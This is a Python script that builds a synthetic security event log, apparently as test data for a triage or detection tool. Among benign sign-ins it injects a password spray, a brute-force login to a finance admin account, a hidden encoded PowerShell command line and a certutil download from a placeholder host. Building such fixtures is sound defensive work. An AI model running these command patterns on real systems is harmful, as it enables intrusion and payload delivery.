from __future__ import annotations

import argparse
import json
import random
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any


def build_dataset(event_count: int, seed: int = 42) -> list[dict[str, Any]]:
    if event_count < 20:
        raise ValueError("event_count must be at least 20")

    rng = random.Random(seed)
    start = datetime(2026, 8, 1, 8, 0, tzinfo=UTC)
    users = [f"user{index:03d}@example.org" for index in range(1, 101)]
    devices = [f"LAB-WS-{index:03d}" for index in range(1, 51)]
    events: list[dict[str, Any]] = []

    benign_count = event_count - 16
    for index in range(benign_count):
        timestamp = start + timedelta(seconds=index * 15)
        user = rng.choice(users)
        events.append(
            {
                "timestamp": timestamp.isoformat().replace("+00:00", "Z"),
                "event_id": f"benign-{index:07d}",
                "event_type": "SignIn",
                "outcome": "Success" if rng.random() > 0.04 else "Failure",
                "user": user,
                "source_ip": f"192.0.2.{rng.randint(1, 240)}",
                "device": rng.choice(devices),
            }
        )

    attack_start = start + timedelta(seconds=benign_count * 15 + 60)
    for index, user in enumerate(users[:5]):
        events.append(
            {
                "timestamp": (attack_start + timedelta(seconds=index * 30)).isoformat().replace("+00:00", "Z"),
                "event_id": f"spray-{index:02d}",
                "event_type": "SignIn",
                "outcome": "Failure",
                "user": user,
                "source_ip": "203.0.113.250",
                "device": devices[index],
            }
        )

    victim = "finance.admin@example.org"
    brute_start = attack_start + timedelta(minutes=20)
    for index in range(8):
        events.append(
            {
                "timestamp": (brute_start + timedelta(seconds=index * 35)).isoformat().replace("+00:00", "Z"),
                "event_id": f"brute-{index:02d}",
                "event_type": "SignIn",
                "outcome": "Failure",
                "user": victim,
                "source_ip": "198.51.100.250",
                "device": "FIN-WS-999",
            }
        )
    events.append(
        {
            "timestamp": (brute_start + timedelta(minutes=5)).isoformat().replace("+00:00", "Z"),
            "event_id": "brute-success",
            "event_type": "SignIn",
            "outcome": "Success",
            "user": victim,
            "source_ip": "198.51.100.250",
            "device": "FIN-WS-999",
        }
    )
    events.append(
        {
            "timestamp": (brute_start + timedelta(minutes=6)).isoformat().replace("+00:00", "Z"),
            "event_id": "powershell-encoded",
            "event_type": "ProcessCreated",
            "user": victim,
            "device": "FIN-WS-999",
            "command_line": "powershell.exe -WindowStyle Hidden -EncodedCommand UwB5AG4AdABoAGUAdABpAGMA",
        }
    )
    events.append(
        {
            "timestamp": (brute_start + timedelta(minutes=7)).isoformat().replace("+00:00", "Z"),
            "event_id": "certutil-download",
            "event_type": "ProcessCreated",
            "user": victim,
            "device": "FIN-WS-999",
            "command_line": "certutil.exe -urlcache -split -f https://example.invalid/file.bin file.bin",
        }
    )

    return sorted(events, key=lambda item: item["timestamp"])


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate a deterministic synthetic TriageBloom dataset")
    parser.add_argument("--events", type=int, default=10_000, help="Total number of events")
    parser.add_argument("--seed", type=int, default=42, help="Random seed")
    parser.add_argument("--output", type=Path, default=Path("synthetic-events.json"), help="Output JSON path")
    args = parser.parse_args()

    try:
        dataset = build_dataset(args.events, args.seed)
    except ValueError as exc:
        parser.error(str(exc))

    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(dataset, indent=2), encoding="utf-8")
    print(f"Wrote {len(dataset)} synthetic events to {args.output}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
